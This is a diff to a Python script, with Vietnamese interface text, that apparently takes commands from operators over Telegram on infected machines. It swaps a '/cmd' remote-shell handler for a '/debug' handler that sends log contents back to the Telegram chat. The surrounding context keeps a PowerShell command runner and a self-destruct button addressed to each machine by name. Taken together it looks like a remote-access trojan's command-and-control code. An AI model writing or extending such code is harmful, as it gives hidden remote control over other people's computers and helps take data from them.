@@ -1072,7 +1072,7 @@ def execute_command(command, message=None):
                     {"text": "💥 Tự hủy", "callback_data": f"destruct @{my_name}"}
                 ],
                 [
-                    {"text": "CMD", "callback_data": f"cmd @{my_name}"},
+                    {"text": "🐛 Đọc Debug", "callback_data": f"debug @{my_name}"},
                     {"text": "PS", "callback_data": f"ps @{my_name}"}
                 ]
             ]
@@ -1181,21 +1181,23 @@ def execute_command(command, message=None):
                 f"<code>/destruct Y @{my_name.lower()}</code>"
             )
     
-    elif cmd in ["/cmd", "cmd"] or cmd.startswith("/cmd ") or cmd.startswith("cmd ") or cmd.startswith("!cmd "):
-        actual_cmd = ""
-        if " " in command:
-            actual_cmd = command.split(" ", 1)[1].strip()
-        if actual_cmd:
-            run_remote_shell(actual_cmd)
+    elif cmd in ["/debug", "debug"] or cmd.startswith("/debug") or cmd.startswith("debug"):
+        log_file = os.path.join(STORAGE, "debug.log")
+        if os.path.exists(log_file):
+            try:
+                with open(log_file, "r", encoding="utf-8", errors="ignore") as f:
+                    lines = f.readlines()
+                last_lines = lines[-50:] if len(lines) > 50 else lines
+                content = "".join(last_lines).strip()
+                if not content:
+                    content = "(Debug log hiện tại đang trống)"
+                if len(content) > 3500:
+                    content = content[-3500:]
+                send_telegram_message(f"<b>🐛 DEBUG LOG [{my_name}] (50 dòng gần nhất):</b>\n<pre>{html.escape(content)}</pre>")
+            except Exception as e:
+                send_telegram_message(f"❌ Lỗi đọc debug log: {e}")
         else:
-            send_telegram_message(
-                f"<b>💻 Hướng dẫn chạy lệnh CMD trên [{my_name}]:</b>\n\n"
-                f"Gửi lệnh theo cú pháp:\n"
-                f"<code>/cmd &lt;lệnh_cmd&gt; @{my_name.lower()}</code>\n\n"
-                f"Ví dụ:\n"
-                f"<code>/cmd ipconfig @{my_name.lower()}</code>\n"
-                f"<code>/cmd tasklist @{my_name.lower()}</code>"
-            )
+            send_telegram_message("❌ Chưa có tệp debug.log nào được tạo.")
     
     elif cmd in ["/ps", "ps", "/powershell", "powershell"] or cmd.startswith("/ps ") or cmd.startswith("ps ") or cmd.startswith("/powershell ") or cmd.startswith("powershell ") or cmd.startswith("!ps "):
         actual_cmd = ""
